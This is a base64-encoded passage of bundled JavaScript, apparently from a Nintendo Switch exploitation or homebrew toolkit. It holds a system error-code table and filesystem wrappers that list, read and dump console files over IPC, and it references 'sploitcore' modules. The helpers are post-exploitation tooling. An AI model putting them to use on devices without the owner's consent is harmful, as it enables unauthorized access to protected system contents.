uU3RyaW5nID0gZGVzY3JpcHRpb25TdHJpbmc7XG5cdH1cblxuXHR0b1N0cmluZygpIHtcblx0XHRyZXR1cm4gdGhpcy5tZXNzYWdlO1xuXHR9XG59XG5cbm1vZHVsZS5leHBvcnRzID0gUmVzdWx0Q29kZTtcblxuLy8gbGFzdCB1cGRhdGVkOiBodHRwOi8vc3dpdGNoYnJldy5vcmcvaW5kZXgucGhwP3RpdGxlPUVycm9yX2NvZGVzJm9sZGlkPTI1MzZcbm1vZHVsZXMgPSB7XG5cdDE6ICdLZXJuZWwnLFxuXHQyOiAnRlMnLFxuXHQzOiAnTlZJRElBJyxcblx0NTogJ05DTScsXG5cdDY6ICdERCcsXG5cdDg6ICdMUicsXG5cdDk6ICdMb2FkZXInLFxuXHQxMDogJ0NNSUYgKElQQyBjb21tYW5kIGludGVyZmFjZSknLFxuXHQxMTogJ0hJUEMgKElQQyknLFxuXHQxNTogJ1BNJyxcblx0MTY6ICdOUycsXG5cdDE4OiAnSFRDJyxcblx0MjE6ICdTTScsXG5cdDIyOiAnUk8gdXNlcmxhbmQnLFxuXHQyNDogJ1NETU1DJyxcblx0MjY6ICdTUEwnLFxuXHQxMDA6ICdFVEhDJyxcblx0MTAxOiAnSTJDJyxcblx0MTA1OiAnU2V0dGluZ3MnLFxuXHQxMTA6ICdOSUZNJyxcblx0MTE0OiAnRGlzcGxheScsXG5cdDExNjogJ05UQycsXG5cdDExNzogJ0ZHTScsXG5cdDEyMDogJ1BDSUUnLFxuXHQxMjE6ICdGcmllbmRzJyxcblx0MTIzOiAnU1NMJyxcblx0MTI0OiAnQWNjb3VudCcsXG5cdDEyODogJ0FNJyxcblx0MTI2OiAnTWlpJyxcblx0MTI5OiAnUGxheSBSZXBvcnQnLFxuXHQxMzM6ICdQQ1YnLFxuXHQxMzQ6ICdPTU0nLFxuXHQxMzc6ICdOSU0nLFxuXHQxMzg6ICdQU0MnLFxuXHQxNDA6ICdVU0InLFxuXHQxNDM6ICdCVE0nLFxuXHQxNDc6ICdFUlBUJyxcblx0MTQ4OiAnQVBNJyxcblx0MTU0OiAnTlBOUycsXG5cdDE1NzogJ0FSUCcsXG5cdDE1ODogJ0JPT1QnLFxuXHQxNjE6ICdORkMnLFxuXHQxNjI6ICdVc2VybGFuZCBhc3NlcnQnLFxuXHQxNjg6ICdVc2VybGFuZCBjcmFzaCcsXG5cdDIwMzogJ0hJRCcsXG5cdDIwNjogJ0NhcHR1cmUnLFxuXHQzNDU6ICdsaWJueCcsXG5cdDY1MTogJ1RDJyxcblx0ODAwOiAnR2VuZXJhbCB3ZWItYXBwbGV0Jyxcblx0ODA5OiAnV2lmaVdlYkF1dGhBcHBsZXQnLFxuXHQ4MTA6ICdXaGl0ZWxpc3RlZC1hcHBsZXQnLFxuXHQ4MTE6ICdTaG9wTidcbn07XG5cbnZhciBjb2Rlc3RycyA9IFtcblx0JzB4MUMwMSAgMTQgIEludmFsaWQga2VybmVsIGNhcGFiaWxpdHkgZGVzY3JpcHRvcicsXG5cdCcweDQyMDEgIDMzICBJc0RlYnVnTW9kZSBpc25cXCd0IHNldC4nLFxuXHQnMHhDQTAxICAxMDEgIEludmFsaWQgc2l6ZScsXG5cdCcweENDMDEgIDEwMiAgSW52YWxpZCBhZGRyZXNzJyxcblx0JzB4Q0UwMSAgMTAzICBBZGRyZXNzIGlzIE5VTEwgLyBidWZmZXIgc2l6ZSBpcyB0b28gc21hbGwuJyxcblx0JzB4RDAwMSAgMTA0ICBNZW1vcnkgZnVsbCcsXG5cdCcweEQyMDEgIDEwNSAgSGFuZGxlLXRhYmxlIGZ1bGwuJyxcblx0JzB4RDQwMSAgMTA2ICBJbnZhbGlkIG1lbW9yeSBzdGF0ZSAvIGludmFsaWQgbWVtb3J5IHBlcm1pc3Npb25zLicsXG5cdCcweEQ4MDEgIDEwOCAgV2hlbiB0cnlpbmcgdG8gc2V0IGV4ZWN1dGFibGUgcGVybWlzc2lvbiBvbiBtZW1vcnkuJyxcblx0JzB4REMwMSAgMTEwICBTdGFjayBhZGRyZXNzIG91dHNpZGUgYWxsb3dlZCByYW5nZScsXG5cdCcweEUwMDEgIDExMiAgSW52YWxpZCB0aHJlYWQgcHJpb3JpdHkuJyxcblx0JzB4RTIwMSAgMTEzICBJbnZhbGlkIHByb2Nlc3NvciBpZC4nLFxuXHQnMHhFNDAxICAxMTQgIEludmFsaWQgaGFuZGxlLicsXG5cdCcweEU2MDEgIDExNSAgU3lzY2FsbCBjb3B5IGZyb20gdXNlciBmYWlsZWQuJyxcblx0JzB4RTgwMSAgMTE2ICBJbnZhbGlkIGNvbWJpbmF0aW9uJyxcblx0JzB4RUEwMSAgMTE3ICBUaW1lIG91dD8gV2hlbiB5b3UgZ2l2ZSAwIGhhbmRsZXMgdG8gc3ZjV2FpdFN5bmNocm9uaXphdGlvbk4uJyxcblx0JzB4RUMwMSAgMTE4ICBDYW5jZWxlZC9pbnRlcnJ1cHRlZCBbP10nLFxuXHQnMHhFRTAxICAxMTkgIEV4Y2VlZGluZyBtYXhpbXVtJyxcblx0JzB4RjAwMSAgMTIwICBJbnZhbGlkIGVudW0nLFxuXHQnMHhGMjAxICAxMjEgIE5vIHN1Y2ggZW50cnknLFxuXHQnMHhGNDAxICAxMjIgIElycS9EZXZpY2VBZGRyZXNzU3BhY2Uvey4uLn0gYWxyZWFkeSByZWdpc3RlcmVkJyxcblx0JzB4RjYwMSAgMTIzICBQb3J0IHJlbW90ZSBkZWFkJyxcblx0JzB4RjgwMSAgMTI0ICBbVXNlcm1vZGVdIFVuaGFuZGxlZCBpbnRlcnJ1cHQnLFxuXHQnMHhGQTAxICAxMjUgIFdyb25nIG1lbW9yeSBwZXJtaXNzaW9uPycsXG5cdCcweEZDMDEgIDEyNiAgUmVzZXJ2ZWQgdmFsdWUnLFxuXHQnMHhGRTAxICAxMjcgIEludmFsaWQgaGFyZHdhcmUgYnJlYWtwb2ludCcsXG5cdCcweDEwMDAxICAxMjggIFtVc2VybW9kZV0gRmF0YWwgZXhjZXB0aW9uJyxcblx0JzB4MTA2MDEgIDEzMSAgUG9ydCBtYXggc2Vzc2lvbnMgZXhjZWVkZWQnLFxuXHQnMHgxMDgwMSAgMTMyICBSZXNvdXJjZSBsaW1pdCBleGNlZWRlZCcsXG5cdCcweDQxMDAxICA1MjAgIFByb2Nlc3Mgbm90IGJlaW5nIGRlYnVnZ2VkJyxcblx0JzB4RTAyICA3ICBIaWdoIGJ5dGUgaW4gaW5wdXQgdTY0IGlzIHplcm8uJyxcblx0XCIweDc4MDIgIDYwICBUaGUgc3BlY2lmaWVkIE5DQS10eXBlIGRvZXNuJ3QgZXhpc3QgZm9yIHRoaXMgdGl0bGUuXCIsXG5cdCcweDdEMjAyICAxMDAxICBQcm9jZXNzIGRvZXMgbm90IGhhdmUgUm9tRnMnLFxuXHQnMHg3RDQwMiAgMTAwMiAgVGl0bGUtaWQgbm90IGZvdW5kIC8gc2F2ZWRhdGEgbm90IGZvdW5kLicsXG5cdCcweDEzQjAwMiAgMjUyMCAgR2FtZWNhcmQgbm90IGluc2VydGVkJyxcblx0JzB4MTNEQTAyICAyNTQxICBWZXJzaW9uIGNoZWNrIGZhaWxlZCB3aGVuIG1vdW50aW5nIGdhbWVjYXJkIHN5c3VwZGF0ZSBwYXJ0aXRpb24/Jyxcblx0JzB4MTcxNDAyICAyOTU0ICBJbnZhbGlkIGdhbWVjYXJkIGhhbmRsZS4nLFxuXHQnMHgxOTYwMDIgIDMyNDggIE91dCBvZiBtZW1vcnknLFxuXHQnMHgxOTYyMDIgIDMyNDkgIE91dCBvZiBtZW1vcnknLFxuXHQnMHgxQTRBMDIgIDMzNjUgIE91dCBvZiBtZW1vcnknLFxuXHQnMHgyMzVFMDIgIDQ1MjcgIE5DQS1wYXRoIHVzZWQgd2l0aCB0aGUgd3JvbmcgdGl0bGVJRC4nLFxuXHQnMHgyNTBFMDIgIDQ3NDMgIENvcnJ1cHRlZCBOQVgwIGhlYWRlci4nLFxuXHQnMHgyNTEwMDIgIDQ3NDQgIEludmFsaWQgTkFYMCBtYWdpY251bS4nLFxuXHQnMHgyRUUyMDIgIDYwMDEgIEludmFsaWQgaW5wdXQnLFxuXHQnMHgyRUU2MDIgIDYwMDMgIFBhdGggdG9vIGxvbmcnLFxuXHQnMHgyRjVBMDIgIDYwNjEgIE9mZnNldCBvdXRzaWRlIHN0b3JhZ2UnLFxuXHQnMHgzMTM4MDIgIDYzMDAgIE9wZXJhdGlvbiBub3Qgc3VwcG9ydGVkJyxcblx0JzB4MzIwMDAyICA2NDAwICBQZXJtaXNzaW9uIGRlbmllZCcsXG5cdCcweDMyNjYwMiAgNjQ1MSAgTWlzc2luZyB0aXRsZWtleSg/KSByZXF1aXJlZCB0byBtb3VudCBjb250ZW50Jyxcblx0JzB4M0VBMDMgIDUwMSAgSW52YWxpZCBoYW5kbGUnLFxuXHQnMHgzRUUwMyAgNTAzICBJbnZhbGlkIG1lbW9yeSBtaXJyb3InLFxuXHRcIjB4QTA1ICA1ICBOY2FJRCBub3QgZm91bmQuIFJldHVybmVkIHdoZW4gYXR0ZW1wdGluZyB0byBtb3VudCB0aXRsZXMgd2hpY2ggZXhpc3QgdGhhdCBhcmVuJ3QgKjhYWCB0aXRsZXMsIHRoZSBzYW1lIHdheSAqOFhYIHRpdGxlcyBhcmUgbW91bnRlZC5cIixcblx0JzB4RTA1ICA3ICBUaXRsZUlkIG5vdCBmb3VuZCcsXG5cdCcweDE4MDUgIDEyICBJbnZhbGlkIFN0b3JhZ2VJZCcsXG5cdCcweERDMDUgIDExMCAgR2FtZWNhcmQgbm90IGluc2VydGVkJyxcblx0JzB4MTdDMDUgIDE5MCAgR2FtZWNhcmQgbm90IGluaXRpYWxpemVkJyxcblx0JzB4MUY0MDUgIDI1MCAgU2RjYXJkIG5vdCBpbnNlcnRlZCcsXG5cdCcweDIwODA1ICAyNjAgIFN0b3JhZ2Ugbm90IG1vdW50ZWQnLFxuXHQnMHg0MDggIDIgIE5vdCBpbml0aWFsaXplZC4nLFxuXHQnMHg2MDggIDMgIEludmFsaWQgY29udHJvbCBTdG9yYWdlSUQuJyxcblx0JzB4ODA4ICA0ICBTdG9yYWdlIG5vdCBmb3VuZC4nLFxuXHQnMHhBMDggIDUgIEFjY2VzcyBkZW5pZWQnLFxuXHQnMHhFMDggIDcgIFRpdGxlIGlzIG5vdCByZWdpc3RlcmVkLicsXG5cdCcweDQwOSAgMiAgTWF4aW11bSBwcm9jZXNzZXMgbG9hZGVkLicsXG5cdCcweDY2MDkgIDUxICBJbnZhbGlkIG1lbW9yeSBzdGF0ZS9wZXJtaXNzaW9uJyxcblx0JzB4NkEwOSAgNTMgIEludmFsaWQgTlJSJyxcblx0JzB4QTIwOSAgODEgIFVuYWxpZ25lZCBOUlIgYWRkcmVzcycsXG5cdCcweEE0MDkgIDgyICBCYWQgTlJSIHNpemUnLFxuXHQnMHhBQTA5ICA4NSAgQmFkIE5SUiBhZGRyZXNzJyxcblx0XCIweDFBODBBICAyMTIgIEJhZCBtYWdpYyAoZXhwZWN0ZWQgJ1NGQ08nKVwiLFxuXHQnMHgyMEIgIDEgIFNpemUgdG9vIGJpZyB0byBmaXQgdG8gbWFyc2hhbC4nLFxuXHQnMHgxMUEwQiAgMTQxICBXZW50IHBhc3QgbWF4aW11bSBkdXJpbmcgbWFyc2hhbGxpbmcuJyxcblx0XCIweDE5MDBCICAyMDAgIFNlc3Npb24gZG9lc24ndCBzdXBwb3J0IGRvbWFpbnMuXCIsXG5cdCcweDI1QTBCICAzMDEgIFJlbW90ZSBwcm9jZXNzIGlzIGRlYWQuJyxcblx0JzB4M0Q2MEIgIDQ5MSAgSVBDIFF1ZXJ5IDEgZmFpbGVkLicsXG5cdCcweDIwRiAgMSAgUGlkIG5vdCBmb3VuZCcsXG5cdCcweDYwRiAgMyAgUHJvY2VzcyBoYXMgbm8gcGVuZGluZyBldmVudHMnLFxuXHQnMHg0MTAgIDIgIFRpdGxlLWlkIG5vdCBmb3VuZCcsXG5cdCcweEYwMTAgIDEyMCAgR2FtZWNhcmQgc3lzdXBkYXRlIG5vdCByZXF1aXJlZCcsXG5cdCcweDFGNjEwICAyNTEgIFVuZXhwZWN0ZWQgU3RvcmFnZUlkJyxcblx0JzB4NDE1ICAyICBOb3QgaW5pdGlhbGl6ZWQuJyxcblx0JzB4NjE1ICAzICBNYXggc2Vzc2lvbnMnLFxuXHQnMHhDMTUgIDYgIEludmFsaWQgbmFtZSAoYWxsIHplcm9lcyknLFxuXHQnMHgxMDE1ICA4ICBQZXJtaXNzaW9uIGRlbmllZCcsXG5cdCcweDQxNiAgMiAgQWRkcmVzcyBzcGFjZSBpcyBmdWxsJyxcblx0JzB4NjE2ICAzICBOUk8gYWxyZWFkeSBsb2FkZWQnLFxuXHQnMHg4MTYgIDQgIEludmFsaWQgTlJPIGhlYWRlciB2YWx1ZXMnLFxuXHQnMHhDMTYgIDYgIEJhZCBOUlIgbWFnaWMnLFxuXHQnMHgxMDE2ICA4ICBSZWFjaGVkIG1heCBOUlIgY291bnQnLFxuXHQnMHgxMjE2ICA5ICBVbmFibGUgdG8gdmVyaWZ5IE5STyBoYXNoIG9yIE5SUiBzaWduYXR1cmUnLFxuXHQnMHg4MDIxNiAgMTAyNSAgQWRkcmVzcyBub3QgcGFnZS1hbGlnbmVkJyxcblx0JzB4ODA0MTYgIDEwMjYgIEluY29ycmVjdCBOUk8gc2l6ZScsXG5cdCcweDgwODE2ICAxMDI4ICBOUk8gbm90IGxvYWRlZCcsXG5cdCcweDgwQTE2ICAxMDI5ICBOUlIgbm90IGxvYWRlZCcsXG5cdCcweDgwQzE2ICAxMDMwICBBbHJlYWR5IGluaXRpYWxpemVkJyxcblx0JzB4ODBFMTYgIDEwMzEgIE5vdCBpbml0aWFsaXplZCcsXG5cdCcweDQxQSAgMiAgQXJndW1lbnQgaXMgaW52YWxpZCcsXG5cdCcweEQwMUEgIDEwNCAgQWxsIEFFUyBlbmdpbmVzIGJ1c3knLFxuXHQnMHhEMjFBICAxMDUgIEludmFsaWQgQUVTIGVuZ2luZS1pZCcsXG5cdCcweDI3MiAgMSAgSW52YWxpZCBBcHBsZXRSZXNvdXJjZVVzZXJJZCcsXG5cdCcweENDNzQgIDEwMiAgVGltZSBub3Qgc2V0Jyxcblx0JzB4Mjg3QyAgMjAgIEFyZ3VtZW50IGlzIE5VTEwnLFxuXHQnMHgyQzdDICAyMiAgQXJndW1lbnQgaXMgaW52YWxpZCcsXG5cdCcweDNDN0MgIDMwICBCYWQgaW5wdXQgYnVmZmVyIHNpemUnLFxuXHQnMHg0MDdDICAzMiAgSW52YWxpZCBpbnB1dCBidWZmZXInLFxuXHQnMHgzQzlEICAzMCAgQWRkcmVzcyBpcyBOVUxMJyxcblx0JzB4M0U5RCAgMzEgIFBJRCBpcyBOVUxMJyxcblx0JzB4NTQ5RCAgNDIgIEFscmVhZHkgYm91bmQnLFxuXHQnMHhDQzlEICAxMDIgIEludmFsaWQgUElEJyxcblx0JzB4M0NGMDg5ICA3ODAwICBVbmtub3duL2ludmFsaWQgbGliY3VybCBlcnJvci4nXTtcblxuY29kZXN0cnMuZm9yRWFjaCgoY29kZXN0cikgPT4ge1xuXHR2YXIgbWF0Y2g7XG5cdGlmICgobWF0Y2ggPSAvXigweFtBLUZhLWYwLTldKylcXHMrWzAtOV0rXFxzKyguKykkL2dtLmV4ZWMoY29kZXN0cikpICE9PSBudWxsKSB7XG5cdFx0dmFyIGNvZGUgPSBwYXJzZUludChtYXRjaFsxXSwgMTYpO1xuXHRcdHZhciBkZXNjU3RyID0gbWF0Y2hbMl07XG5cdFx0Y29kZXNbY29kZV0gPSBkZXNjU3RyO1xuXHR9XG59KTtcbiIsIi8qIGVzbGludCBuby1yZWRlY2xhcmU6IFwib2ZmXCIgKi9cblxudmFyIHV0aWxzID0gcmVxdWlyZSgnLi4vdXRpbHMnKTtcblxuZnVuY3Rpb24gSURpcmVjdG9yeSAoc2MsIHBhdGgsIGhhbmRsZSwgZnMpIHtcblx0dGhpcy5zYyA9IHNjO1xuXHR0aGlzLmZzID0gZnM7XG5cdHRoaXMuaGFuZGxlID0gaGFuZGxlO1xuXHR0aGlzLnBhdGggPSBwYXRoO1xufVxuXG5JRGlyZWN0b3J5LnByb3RvdHlwZS5HZXRFbnRyeUNvdW50ID0gZnVuY3Rpb24gKCkge1xuXHRyZXR1cm4gdGhpcy5zYy5pcGNNc2coMSkuc2VuZFRvKHRoaXMuaGFuZGxlKS5hc1Jlc3VsdCgpLm1hcCgocikgPT4gW3IuZGF0YUJ1ZmZlclswXSwgci5kYXRhQnVmZmVyWzFdXSk7XG59O1xuXG5JRGlyZWN0b3J5LnByb3RvdHlwZS5HZXRFbnRyaWVzID0gZnVuY3Rpb24gKGJ1ZiwgbnVtRW50cmllcykge1xuXHRpZihidWYuYnl0ZUxlbmd0aCA8IDB4MzEwICogbnVtRW50cmllcykge1xuXHRcdHRocm93IG5ldyBFcnJvcihcImJ1ZmZlciB0b28gc21hbGxcIik7XG5cdH1cblx0cmV0dXJuIHRoaXMuc2MuaXBjTXNnKDApLmRhdGEoMCkuYkRlc2NyaXB0b3IoYnVmLCAweDMxMCAqIG51bUVudHJpZXMsIDApLnNlbmRUbyh0aGlzLmhhbmRsZSkuYXNSZXN1bHQoKTtcbn07XG5cbklEaXJlY3RvcnkucHJvdG90eXBlLkRpckxpc3QgPSBmdW5jdGlvbiAoaW5kZW50YXRpb24pIHtcblx0dmFyIHMgPSAnJztcblxuXHRpZiAoaW5kZW50YXRpb24gIT09IHVuZGVmaW5lZCkge1xuXHRcdGZvciAodmFyIGkgPSAwOyBpIDwgaW5kZW50YXRpb247IGkrKykge1xuXHRcdFx0cyArPSAnICAgJztcblx0XHR9XG5cdH1cblxuXHR2YXIgZW50cnlDb3VudCA9IHV0aWxzLnRydW5jMzIodGhpcy5HZXRFbnRyeUNvdW50KCkuYXNzZXJ0T2soKSk7XG5cblx0aWYgKGVudHJ5Q291bnQgPiAwKSB7XG5cdFx0dmFyIGVudHJ5QnVmID0gbmV3IFVpbnQzMkFycmF5KDB4MzEwICogZW50cnlDb3VudCk7XG5cdFx0dGhpcy5HZXRFbnRyaWVzKGVudHJ5QnVmLCBlbnRyeUNvdW50KS5hc3NlcnRPaygpO1xuXHRcdGZvciAoaSA9IDA7IGkgPCBlbnRyeUNvdW50OyBpKyspIHtcblx0XHRcdHZhciBmbiA9IHRoaXMucGF0aCArIHV0aWxzLnU4YTJzdHIobmV3IFVpbnQ4QXJyYXkoZW50cnlCdWYuYnVmZmVyLCAweDMxMCAqIGksIDB4MzAwKSk7XG5cdFx0XHR2YXIgZVR5cGUgPSBlbnRyeUJ1ZlsoMHgzMTAgKiBpICsgMHgzMDQpID4+IDJdO1xuXHRcdFx0aWYgKGVUeXBlID09PSAxKSB7XG5cdFx0XHRcdHV0aWxzLmxvZyhzICsgJzxGSUxFPiAnICsgZm4pO1xuXHRcdFx0fSBlbHNlIHtcblx0XHRcdFx0dXRpbHMubG9nKHMgKyAnPEZPTERFUj4gJyArIGZuICsgJy8nKTtcblx0XHRcdFx0dmFyIGYgPSB0aGlzLmZzLk9wZW5EaXIoZm4gKyAnLycpLmFzc2VydE9rKCk7XG5cdFx0XHRcdHRyeSB7XG5cdFx0XHRcdFx0Zi5EaXJMaXN0KGluZGVudGF0aW9uICsgMSk7XG5cdFx0XHRcdH0gZmluYWxseSB7XG5cdFx0XHRcdFx0Zi5DbG9zZSgpO1xuXHRcdFx0XHR9XG5cdFx0XHR9XG5cdFx0fVxuXHR9XG59O1xuXG5JRGlyZWN0b3J5LnByb3RvdHlwZS5EaXJEdW1wID0gZnVuY3Rpb24gKGR1bXBQYXRoKSB7XG5cdHZhciBlbnRyeUNvdW50ID0gdXRpbHMudHJ1bmMzMih0aGlzLkdldEVudHJ5Q291bnQoKS5hc3NlcnRPaygpKTtcblx0aWYgKGVudHJ5Q291bnQgPiAwKSB7XG5cdFx0dmFyIGVudHJ5QnVmID0gbmV3IFVpbnQzMkFycmF5KDB4MzEwICogZW50cnlDb3VudCk7XG5cdFx0dGhpcy5HZXRFbnRyaWVzKGVudHJ5QnVmLCBlbnRyeUNvdW50KS5hc3NlcnRPaygpO1xuXHRcdGZvciAodmFyIGkgPSAwOyBpIDwgZW50cnlDb3VudDsgaSsrKSB7XG5cdFx0XHR2YXIgZm4gPSB0aGlzLnBhdGggKyB1dGlscy51OGEybnVsbHN0cihuZXcgVWludDhBcnJheShlbnRyeUJ1Zi5idWZmZXIsIDB4MzEwICogaSwgMHgzMDApKTtcblx0XHRcdHZhciBlVHlwZSA9IGVudHJ5QnVmWygweDMxMCAqIGkgKyAweDMwNCkgPj4gMl07XG5cdFx0XHRpZiAoZVR5cGUgPT09IDEpIHtcblx0XHRcdFx0dXRpbHMubG9nKCc8RklMRT4gJyArIGZuKTtcblx0XHRcdFx0dmFyIGZwID0gdGhpcy5mcy5PcGVuRmlsZShmbikuYXNzZXJ0T2soKTtcblx0XHRcdFx0dHJ5IHtcblx0XHRcdFx0XHR2YXIgYnVmID0gZnAuUmVhZEFsbCgpLmFzc2VydE9rKCk7XG5cdFx0XHRcdFx0dGhpcy5zYy5tZW1kdW1wKGJ1ZiwgZnAuR2V0U2l6ZSgpLmFzc2VydE9rKCksIGR1bXBQYXRoICsgZm4pO1xuXHRcdFx0XHR9IGZpbmFsbHkge1xuXHRcdFx0XHRcdGZwLkNsb3NlKCk7XG5cdFx0XHRcdH1cblx0XHRcdH0gZWxzZSB7XG5cdFx0XHRcdHV0aWxzLmxvZygnPEZPTERFUj4gJyArIGZuICsgJy8nKTtcblx0XHRcdFx0dmFyIGYgPSB0aGlzLmZzLk9wZW5EaXIoZm4gKyAnLycpLmFzc2VydE9rKCk7XG5cdFx0XHRcdHRyeSB7XG5cdFx0XHRcdFx0Zi5EaXJEdW1wKGR1bXBQYXRoKTtcblx0XHRcdFx0fSBmaW5hbGx5IHtcblx0XHRcdFx0XHRmLkNsb3NlKCk7XG5cdFx0XHRcdH1cblx0XHRcdH1cblx0XHR9XG5cdH1cbn07XG5cbklEaXJlY3RvcnkucHJvdG90eXBlLkNsb3NlID0gZnVuY3Rpb24gKCkge1xuXHRyZXR1cm4gdGhpcy5zYy5zdmNDbG9zZUhhbmRsZSh0aGlzLmhhbmRsZSk7XG59O1xuXG5tb2R1bGUuZXhwb3J0cyA9IElEaXJlY3Rvcnk7XG4iLCJ2YXIgdXRpbHMgPSByZXF1aXJlKCcuLi91dGlscycpO1xuXG5mdW5jdGlvbiBJRmlsZSAoc2MsIGhhbmRsZSkge1xuXHR0aGlzLnNjID0gc2M7XG5cdHRoaXMuaGFuZGxlID0gaGFuZGxlO1xufVxuXG5JRmlsZS5wcm90b3R5cGUuV3JpdGUgPSBmdW5jdGlvbiAob2Zmc2V0LCBidWYsIHNpemUpIHtcblx0cmV0dXJuIHRoaXMuc2MuaXBjTXNnKDEpLmFEZXNjcmlwdG9yKGJ1Ziwgc2l6ZSwgMSkuZGF0YXU2NCgwLCBvZmZzZXQsIHNpemUpLnNlbmRUbyh0aGlzLmhhbmRsZSkuYXNSZXN1bHQoKTtcbn07XG5cbklGaWxlLnByb3RvdHlwZS5HZXRTaXplID0gZnVuY3Rpb24gKCkge1xuXHRyZXR1cm4gdGhpcy5zYy5pcGNNc2coNCkuc2VuZFRvKHRoaXMuaGFuZGxlKS5hc1Jlc3VsdCgpXG5cdFx0Lm1hcCgocikgPT4gW3IuZGF0YVswXSwgci5kYXRhWzFdXSk7XG59O1xuXG5JRmlsZS5wcm90b3R5cGUuUmVhZCA9IGZ1bmN0aW9uIChzaXplKSB7XG5cdGlmKHNpemUgaW5zdGFuY2VvZiBBcnJheUJ1ZmZlciB8fCBBcnJheUJ1ZmZlci5pc1ZpZXcoc2l6ZSkpIHtcblx0XHR2YXIgbSA9IHNpemU7XG5cdFx0c2l6ZSA9IG0uYnl0ZUxlbmd0aDtcblx0fSBlbHNlIHtcblx0XHR2YXIgbSA9IG5ldyBBcnJheUJ1ZmZlcih1dGlscy50cnVuYzMyKHNpemUpKTtcblx0fVxuXHRyZXR1cm4gdGhpcy5zYy5pcGNNc2coMCkuZGF0YXU2NCgwLCAwLCBzaXplKS5iRGVzY3JpcHRvcihtLCBzaXplLCAxKS5zZW5kVG8odGhpcy5oYW5kbGUpLmFzUmVzdWx0KCkucmVwbGFjZVZhbHVlKG0pO1xufTtcblxuSUZpbGUucHJvdG90eXBlLlJlYWRBbGwgPSBmdW5jdGlvbiAoKSB7XG5cdHZhciBzZWxmID0gdGhpcztcblx0cmV0dXJuIHRoaXMuR2V0U2l6ZSgpLmFuZFRoZW4oKHNpemUpID0+IHtcblx0XHR2YXIgZlNpemUgPSB1dGlscy50cnVuYzMyKHNpemUpO1xuXHRcdHZhciBtID0gbmV3IEFycmF5QnVmZmVyKGZTaXplKTtcblx0XHRyZXR1cm4gc2VsZi5zYy5pcGNNc2coMCkuZGF0YXU2NCgwLCAwLCBmU2l6ZSkuYkRlc2NyaXB0b3IobSwgZlNpemUsIDEpLnNlbmRUbyhzZWxmLmhhbmRsZSkuYXNSZXN1bHQoKS5yZXBsYWNlVmFsdWUobSk7XG5cdH0pO1xufTtcblxuSUZpbGUucHJvdG90eXBlLkNsb3NlID0gZnVuY3Rpb24gKCkge1xuXHRyZXR1cm4gdGhpcy5zYy5zdmNDbG9zZUhhbmRsZSh0aGlzLmhhbmRsZSk7XG59O1xuXG5tb2R1bGUuZXhwb3J0cyA9IElGaWxlO1xuIiwidmFyIHV0aWxzID0gcmVxdWlyZSgnLi4vdXRpbHMnKTtcbnZhciBSZXN1bHQgPSByZXF1aXJlKCcuLi9SZXN1bHQnKTtcblxuZnVuY3Rpb24gSUZpbGVTeXN0ZW0gKHNjLCBoYW5kbGUpIHtcblx0dGhpcy5zYyA9IHNjO1xuXHR0aGlzLmhhbmRsZSA9IGhhbmRsZTtcbn1cblxuSUZpbGVTeXN0ZW0ucHJvdG90eXBlLk9wZW5EaXIgPSBmdW5jdGlvbiAoZGlyKSB7XG5cdHZhciBwYXRoID0gdXRpbHMuc3RyMmFiKGRpcik7XG5cdHZhciBzZWxmID0gdGhpcztcblx0cmV0dXJuIHRoaXMuc2MuaXBjTXNnKDkpLmRhdGF1NjQoMykueERlc2NyaXB0b3IocGF0aCwgcGF0aC5ieXRlTGVuZ3RoLCAwKS5zZW5kVG8odGhpcy5oYW5kbGUpLmFzUmVzdWx0KClcblx0XHQubWFwKChyKSA9PiBuZXcgc2VsZi5zYy5JRGlyZWN0b3J5KHNlbGYuc2MsIGRpciwgci5tb3ZlZEhhbmRsZXNbMF0sIHNlbGYpKTtcbn07XG5cbklGaWxlU3lzdGVtLnByb3RvdHlwZS5DcmVhdGVGaWxlID0gZnVuY3Rpb24gKHBhdGgsIHNpemUpIHtcblx0aWYgKHNpemUgPT09IHVuZGVmaW5lZCkge1xuXHRcdHNpemUgPSAweDEwMDtcblx0fVxuXHR2YXIgcGJ1ZiA9IHV0aWxzLnN0cjJhYihwYXRoKTtcblx0dmFyIHJlcyA9IHRoaXMuc2MuaXBjTXNnKDApLmRhdGF1NjQoMCwgc2l6ZSkueERlc2NyaXB0b3IocGJ1ZiwgcGJ1Zi5ieXRlTGVuZ3RoLCAwKS5zZW5kVG8odGhpcy5oYW5kbGUpO1xuXHRyZXR1cm4gcmVzLmFzUmVzdWx0KCk7XG59O1xuXG5JRmlsZVN5c3RlbS5wcm90b3R5cGUuT3BlbkZpbGUgPSBmdW5jdGlvbiAocGF0aCkge1xuXHR2YXIgcGJ1ZiA9IHV0aWxzLnN0cjJhYihwYXRoKTtcblx0dmFyIHNlbGYgPSB0aGlzO1xuXHRyZXR1cm4gdGhpcy5zYy5pcGNNc2coOCkuZGF0YXUzMigzKS54RGVzY3JpcHRvcihwYnVmLCBwYnVmLmJ5dGVMZW5ndGgsIDApLnNlbmRUbyh0aGlzLmhhbmRsZSlcblx0XHQuYXNSZXN1bHQoKVxuXHRcdC5tYXAoKHIpID0+IG5ldyBzZWxmLnNjLklGaWxlKHNlbGYuc2MsIHIubW92ZWRIYW5kbGVzWzBdKSk7XG59O1xuXG5JRmlsZVN5c3RlbS5wcm90b3R5cGUuV3JpdGVCdWZmZXJUb0ZpbGUgPSBmdW5jdGlvbiAob2Zmc2V0LCBidWZmZXIsIHNpemUpIHtcblx0cmV0dXJuIHRoaXMuc2MuaXBjTXNnKDEpLmFEZXNjcmlwdG9yKGJ1ZmZlciwgc2l6ZSwgMSkuZGF0YSgwLCBvZmZzZXQsIHNpemUpLnNlbmRUbyh0aGlzLmhhbmRsZSkuYXNSZXN1bHQoKTtcbn07XG5cbklGaWxlU3lzdGVtLnByb3RvdHlwZS5DbG9zZSA9IGZ1bmN0aW9uICgpIHtcblx0cmV0dXJuIHRoaXMuc2Muc3ZjQ2xvc2VIYW5kbGUodGhpcy5oYW5kbGUpO1xufTtcblxubW9kdWxlLmV4cG9ydHMgPSBJRmlsZVN5c3RlbTtcbiIsIi8qIGVzbGludCBjYW1lbGNhc2U6IFwib2ZmXCIgKi9cbi8qIGVzbGludCBuby1yZWRlY2xhcmU6IFwib2ZmXCIgKi9cbnZhciBzcGxvaXRjb3JlID0gcmVxdWlyZSgnLi9zcGxvaXRjb3JlJyk7XG52YXIgc3Bsb2l0TWl4aW4gPSByZXF1aXJlKCcuL3NwbG9pdE1peGluJyk7XG52YXIgc3ZjTWl4aW4gPSByZXF1aXJlKCcuL3N2YycpO1xudmFyIHV0aWxzID0gcmVxdWlyZSgnLi91dGlscycpO1xudmFyIFJlc3VsdENvZGUgPSByZXF1aXJlKCcuL1J